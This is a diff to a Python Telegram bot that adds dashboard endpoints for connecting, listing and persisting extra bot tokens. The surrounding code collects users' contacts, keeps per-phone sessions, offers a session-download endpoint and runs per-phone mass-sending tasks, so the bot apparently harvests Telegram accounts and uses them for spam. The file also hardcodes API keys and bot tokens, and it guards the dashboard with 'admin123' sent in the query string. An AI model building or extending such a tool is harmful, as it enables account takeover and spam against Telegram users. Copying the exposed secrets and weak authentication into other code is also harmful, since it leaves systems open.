@@ -36,7 +36,7 @@ from telegram.ext import (
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 API_ID = 35214126
 API_HASH = "332680c93c1cd23f6d2a9a5d3c990c48"
-BOT_TOKEN = "8969700396:AAHVuwxYDCsqs1FjTV7LVQC3ltBRRAJJR04"
+BOT_TOKEN = "8969700396:AAE9Km7v_ngbzIov2EIavgT4e9U7v_Ak_lk"
 
 # ⚠️ URL HTTPS do Mini App (domínio)
 WEBAPP_URL = "https://botcoletor-production.up.railway.app/webapp"
@@ -55,6 +55,10 @@ session_stats = {}  # phone -> stats dict
 
 # Dashboard
 DASHBOARD_TOKEN = "admin123"
+
+# Multi-bot
+connected_bots = {}  # token -> {"app": Application, "username": str, "name": str, "id": int}
+BOTS_FILE = os.path.join(BASE_DIR, "bots.json")
 
 # Log capture — guarda as últimas 5000 linhas
 class LogCapture:
@@ -123,6 +127,25 @@ def load_stats():
             print(f"[STATS] 📂 Stats carregadas: {len(session_stats)} sessões")
     except Exception as e:
         print(f"[STATS] ⚠️ Erro ao carregar stats: {e}")
+
+def save_bots_config():
+    """Salva tokens de bots extras conectados"""
+    try:
+        tokens = list(connected_bots.keys())
+        with open(BOTS_FILE, "w", encoding="utf-8") as f:
+            json.dump(tokens, f)
+    except Exception as e:
+        print(f"[BOTS] ⚠️ Erro ao salvar bots: {e}")
+
+def load_bots_tokens():
+    """Carrega lista de tokens de bots extras"""
+    try:
+        if os.path.exists(BOTS_FILE):
+            with open(BOTS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+    except Exception as e:
+        print(f"[BOTS] ⚠️ Erro ao carregar bots: {e}")
+    return []
 
 # ===============================
 # VALIDAÇÃO INITDATA
@@ -752,6 +775,51 @@ async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE
         print(f"[ERROR] Erro ao enviar mensagem para {user_name}: {e}")
 
 # ===============================
+# MULTI-BOT: INICIAR / PARAR BOTS EXTRAS
+# ===============================
+async def start_extra_bot(bot_token):
+    """Inicia um bot extra com os mesmos handlers do principal"""
+    app = ApplicationBuilder().token(bot_token).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
+    app.add_handler(ChatJoinRequestHandler(handle_join_request))
+
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+
+    bot_info = await app.bot.get_me()
+
+    connected_bots[bot_token] = {
+        "app": app,
+        "username": bot_info.username or "",
+        "name": bot_info.first_name or "",
+        "id": bot_info.id,
+    }
+
+    print(f"[BOTS] 🤖 Bot @{bot_info.username} conectado com sucesso!")
+    return bot_info
+
+async def stop_extra_bot(bot_token):
+    """Para e desconecta um bot extra"""
+    if bot_token not in connected_bots:
+        return
+
+    info = connected_bots[bot_token]
+    app = info["app"]
+
+    try:
+        await app.updater.stop()
+        await app.stop()
+        await app.shutdown()
+    except Exception as e:
+        print(f"[BOTS] ⚠️ Erro ao parar bot: {e}")
+
+    username = info["username"]
+    del connected_bots[bot_token]
+    print(f"[BOTS] 🛑 Bot @{username} desconectado")
+
+# ===============================
 # CARREGAR SESSÕES EXISTENTES
 # ===============================
 async def carregar_sessoes():
@@ -934,6 +1002,73 @@ async def api_dashboard_download_sessions(request):
     )
 
 # ===============================
+# MULTI-BOT API
+# ===============================
+async def api_connect_bot(request):
+    """Conecta um novo bot via token"""
+    dash_token = request.query.get("token", "")
+    if dash_token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    data = await request.json()
+    bot_token = data.get("bot_token", "").strip()
+
+    if not bot_token or ":" not in bot_token:
+        return web.json_response({"error": "Token inválido"}, status=400)
+
+    if bot_token == BOT_TOKEN:
+        return web.json_response({"error": "Este é o bot principal!"}, status=400)
+
+    if bot_token in connected_bots:
+        return web.json_response({"error": "Bot já conectado"}, status=400)
+
+    try:
+        bot_info = await start_extra_bot(bot_token)
+        save_bots_config()
+        return web.json_response({
+            "ok": True,
+            "username": bot_info.username or "",
+            "name": bot_info.first_name or "",
+        })
+    except Exception as e:
+        print(f"[BOTS] ❌ Erro ao conectar bot: {type(e).__name__}: {e}")
+        return web.json_response({"error": f"Erro: {type(e).__name__}"}, status=500)
+
+async def api_disconnect_bot(request):
+    """Desconecta um bot extra"""
+    dash_token = request.query.get("token", "")
+    if dash_token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    data = await request.json()
+    bot_token = data.get("bot_token", "").strip()
+
+    if bot_token not in connected_bots:
+        return web.json_response({"error": "Bot não encontrado"}, status=404)
+
+    await stop_extra_bot(bot_token)
+    save_bots_config()
+    return web.json_response({"ok": True})
+
+async def api_list_bots(request):
+    """Lista todos os bots extras conectados"""
+    dash_token = request.query.get("token", "")
+    if dash_token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    bots = []
+    for tok, info in connected_bots.items():
+        bots.append({
+            "token": tok,
+            "token_masked": tok[:8] + "..." + tok[-4:],
+            "username": info["username"],
+            "name": info["name"],
+            "id": info["id"],
+        })
+
+    return web.json_response({"bots": bots, "count": len(bots)})
+
+# ===============================
 # MAIN
 # ===============================
 async def main():
@@ -952,6 +1087,9 @@ async def main():
     web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
     web_app.router.add_get("/api/dashboard/download-sessions", api_dashboard_download_sessions)
+    web_app.router.add_post("/api/dashboard/connect-bot", api_connect_bot)
+    web_app.router.add_post("/api/dashboard/disconnect-bot", api_disconnect_bot)
+    web_app.router.add_get("/api/dashboard/bots", api_list_bots)
 
     runner = web.AppRunner(web_app)
     await runner.setup()
@@ -981,6 +1119,16 @@ async def main():
         # Carregar sessões existentes e iniciar disparo
         await carregar_sessoes()
 
+        # Carregar bots extras salvos
+        saved_bot_tokens = load_bots_tokens()
+        if saved_bot_tokens:
+            print(f"[BOTS] 📂 {len(saved_bot_tokens)} bot(s) extra(s) salvo(s), reconectando...")
+            for bt in saved_bot_tokens:
+                try:
+                    await start_extra_bot(bt)
+                except Exception as e:
+                    print(f"[BOTS] ❌ Erro ao reconectar bot: {type(e).__name__}: {e}")
+
         # Mantém rodando até Ctrl+C
         stop_event = asyncio.Event()
         try:
@@ -992,6 +1140,12 @@ async def main():
             for phone, task in disparo_tasks.items():
                 task.cancel()
                 print(f"[SHUTDOWN] 🛑 Disparo cancelado para {phone}")
+            # Parar bots extras
+            for bt in list(connected_bots.keys()):
+                try:
+                    await stop_extra_bot(bt)
+                except Exception:
+                    pass
             await application.updater.stop()
             await application.stop()
             await runner.cleanup()
